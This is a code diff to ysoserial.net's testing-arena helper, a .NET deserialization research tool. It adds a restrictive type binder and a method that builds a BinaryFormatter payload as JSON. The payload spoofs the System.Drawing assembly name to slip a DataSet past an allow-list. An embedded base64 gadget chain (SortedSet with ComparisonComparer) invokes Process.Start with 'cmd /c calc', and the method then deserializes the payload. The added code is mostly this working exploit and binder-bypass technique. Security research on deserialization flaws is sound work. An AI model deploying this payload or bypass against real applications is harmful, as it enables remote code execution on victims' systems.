@@ -16,6 +16,7 @@ using System.Collections.Specialized;
 using System.Reflection;
 using System.Windows.Data;
 using System.Runtime.Serialization;
+using System.Drawing;
 
 namespace ysoserial.Helpers.TestingArena
 {
@@ -40,15 +41,248 @@ namespace ysoserial.Helpers.TestingArena
         public void Start(InputArgs inputArgs)
         {
             this.inputArgs = inputArgs;
+            // Change the inputs in any ways
+            //inputArgs.Minify = true;
+            //inputArgs.UseSimpleType = true;
+
             // Add your function here perhaps - some examples:
             //MinimiseTCDJsonAndRun();
             //ManualTCDGPayload4Minifying();
             //TextFormatterMinifying();
             //ActivitySurrogateSelector();
+            //SpoofByBinaryFormatterJson();
             Console.ReadLine();
         }
 
+        private class RestrictiveBinder : SerializationBinder
+        {
+            private static string s_allowedTypeName;
+            private static string s_allowedAssemblyName;
+            private static byte[] s_allowedToken;
 
+            static RestrictiveBinder()
+            {
+                s_allowedTypeName = typeof(Bitmap).FullName;
+                AssemblyName assemblyName = new AssemblyName(typeof(Bitmap).Assembly.FullName);
+                if (assemblyName != null)
+                {
+                    s_allowedAssemblyName = assemblyName.Name;
+                    s_allowedToken = assemblyName.GetPublicKeyToken();
+                }
+            }
+
+            /// <summary>
+            ///  Only safe to deserialize types are bypassing this callback, Strings 
+            ///  and arrays of primitive types in particular. We are explicitly allowing
+            ///  System.Drawing.Bitmap type to bind using the default binder.
+            /// </summary>
+            /// <param name="assemblyName"></param>
+            /// <param name="typeName"></param>
+            /// <returns></returns>
+            public override Type BindToType(string assemblyName, string typeName)
+            {
+                if (string.CompareOrdinal(typeName, s_allowedTypeName) == 0)
+                {
+                    AssemblyName nameToBind = null;
+                    try
+                    {
+                        nameToBind = new AssemblyName(assemblyName);
+                    }
+                    catch
+                    {
+                    }
+                    if (nameToBind != null)
+                    {
+                        if (string.CompareOrdinal(nameToBind.Name, s_allowedAssemblyName) == 0)
+                        {
+                            byte[] tokenToBind = nameToBind.GetPublicKeyToken();
+                            if ((tokenToBind != null) &&
+                                (s_allowedToken != null) &&
+                                (tokenToBind.Length == s_allowedToken.Length))
+                            {
+                                bool block = false;
+                                for (int i = 0; i < s_allowedToken.Length; i++)
+                                {
+                                    if (s_allowedToken[i] != tokenToBind[i])
+                                    {
+                                        block = true;
+                                        break;
+                                    }
+                                }
+                                if (!block)
+                                {
+                                    return null;
+                                }
+                            }
+                        }
+                    }
+                }
+                throw new Exception("!");
+            }
+        }
+
+        private void SpoofByBinaryFormatterJson()
+        {
+            /*
+            Bitmap bitmap = new Bitmap(@"c:\pixel.jpg");
+
+            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt1 = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+            MemoryStream lsMs = new MemoryStream();
+            fmt1.Serialize(lsMs, bitmap);
+            lsMs.Position = 0;
+
+            string tcd_json = AdvancedBinaryFormatterParser.StreamToJson(lsMs, false, true, true);
+
+            Console.WriteLine(tcd_json);
+            Console.ReadLine();
+            */
+
+            string fromJsonWithSpoofedAssembly = @"[{'Id': 1,
+    'Data': {
+      '$type': 'SerializationHeaderRecord',
+      'binaryFormatterMajorVersion': 1,
+      'binaryFormatterMinorVersion': 0,
+      'binaryHeaderEnum': 0,
+      'topId': 1,
+      'headerId': -1,
+      'majorVersion': 1,
+      'minorVersion': 0
+}},{'Id': 2,
+    'TypeName': 'Assembly',
+    'Data': {
+      '$type': 'BinaryAssembly',
+      'assemId': 2,
+      'assemblyString': 'System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+}},{'Id': 3,
+    'TypeName': 'Assembly',
+    'Data': {
+      '$type': 'BinaryAssembly',
+      'assemId': 3,
+      'assemblyString': 'System.Data'
+}},{'Id': 4,
+    'TypeName': 'ObjectWithMapTypedAssemId',
+    'Data': {
+      '$type': 'BinaryObjectWithMapTyped',
+      'binaryHeaderEnum': 5,
+      'objectId': 1,
+      'name': 'System.Data.DataSet, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+      'numMembers': 10,
+      'memberNames':['DataSet.RemotingFormat','DataSet.DataSetName','DataSet.Namespace','DataSet.Prefix','DataSet.CaseSensitive','DataSet.LocaleLCID','DataSet.EnforceConstraints','DataSet.ExtendedProperties','DataSet.Tables.Count','DataSet.Tables_0'],
+      'binaryTypeEnumA':[4,1,1,1,0,0,0,2,0,7],
+      'typeInformationA':[null,null,null,null,1,8,1,null,8,2],
+      'typeInformationB':['System.Data.X',null,null,null,1,8,1,null,8,2],
+      'memberAssemIds':[3,0,0,0,0,0,0,0,0,0],
+      'assemId': 2
+}},{'Id': 5,
+    'TypeName': 'ObjectWithMapTypedAssemId',
+    'Data': {
+      '$type': 'BinaryObjectWithMapTyped',
+      'binaryHeaderEnum': 5,
+      'objectId': -4,
+      'name': 'System.Data.SerializationFormat',
+      'numMembers': 1,
+      'memberNames':['value__'],
+      'binaryTypeEnumA':[0],
+      'typeInformationA':[8],
+      'typeInformationB':[8],
+      'memberAssemIds':[0],
+      'assemId': 3
+}},{'Id': 6,
+    'TypeName': 'Int32',
+    'IsPrimitive': true,
+    'Data': {
+      '$type': 'MemberPrimitiveUnTyped',
+      'typeInformation': 8,
+      'value': 1
+}},{'Id': 7,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 5,
+      'value': ''
+}},{'Id': 8,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 5
+}},{'Id': 9,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 5
+}},{'Id': 10,
+    'TypeName': 'Boolean',
+    'IsPrimitive': true,
+    'Data': {
+      '$type': 'MemberPrimitiveUnTyped',
+      'typeInformation': 1,
+      'value': false
+}},{'Id': 11,
+    'TypeName': 'Int32',
+    'IsPrimitive': true,
+    'Data': {
+      '$type': 'MemberPrimitiveUnTyped',
+      'typeInformation': 8,
+      'value': 1033
+}},{'Id': 12,
+    'TypeName': 'Boolean',
+    'IsPrimitive': true,
+    'Data': {
+      '$type': 'MemberPrimitiveUnTyped',
+      'typeInformation': 1,
+      'value': false
+}},{'Id': 13,
+    'TypeName': 'ObjectNull',
+    'Data': {
+      '$type': 'ObjectNull',
+      'nullCount': 1
+}},{'Id': 14,
+    'TypeName': 'Int32',
+    'IsPrimitive': true,
+    'Data': {
+      '$type': 'MemberPrimitiveUnTyped',
+      'typeInformation': 8,
+      'value': 1
+}},{'Id': 15,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 6
+}},{'Id': 16,
+    'TypeName': 'ArraySinglePrimitive',
+    'ArrayBytes': 'AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAcvYyBjYWxjBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=',
+    'Data': {
+      '$type': 'BinaryArray',
+      'objectId': 6,
+      'rank': 1,
+      'lengthA':[2240],
+      'lowerBoundA':[0],
+      'binaryTypeEnum': 0,
+      'typeInformation': 2,
+      'assemId': 0,
+      'binaryHeaderEnum': 15,
+      'binaryArrayTypeEnum': 0
+}},{'Id': 17,
+    'TypeName': 'MessageEnd',
+    'Data': {
+      '$type': 'MessageEnd'
+}}]";
+
+            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(fromJsonWithSpoofedAssembly);
+            try
+            {
+                System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+                //fmt.Binder = new RestrictiveBinder();
+                Console.WriteLine(Convert.ToBase64String(ms.ToArray()));
+                ms.Position = 0;
+                fmt.Deserialize(ms);
+                //SerializersHelper.BinaryFormatter_deserialize(ms.ToArray());
+            }
+            catch
+            {
+                Console.WriteLine("Error");
+            }
+        }
         private void ActivitySurrogateSelector()
         {
             string myApp = "TestConsoleApp_YSONET";
